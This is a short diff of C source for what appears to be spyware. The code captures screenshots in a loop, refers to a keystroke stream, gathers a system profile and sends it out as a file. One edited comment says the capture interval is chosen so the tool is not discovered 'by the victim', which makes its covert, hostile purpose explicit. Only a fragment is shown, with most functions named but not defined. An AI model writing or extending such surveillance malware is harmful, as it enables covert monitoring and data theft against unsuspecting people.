@@ -15,9 +15,7 @@ volatile bool stop_keystrokes_stream = true;
 
 void * start_capture_screenshots (){
 	while(keepRunning){
-		usleep(1000 * 1200); // 1.2 sec
-		printf("%d snap\n", keepRunning);
-		fflush(stdout);
+		usleep(1000 * 1200); // sleep 1.2 sec in order to do not consume too much resources and be discover be the victim
 		capture_screenshot();
 	}
 	return NULL;
@@ -72,6 +70,8 @@ int main (){
 				
 			case GET_SYSTEM_PROFILER :
 				get_system_profiler();
+				printf("!!!!!!!!\n");
+				fflush(stdout);
 				send_file("system_profiler.txt", GET_SYSTEM_PROFILER, true);
 				
 				break;
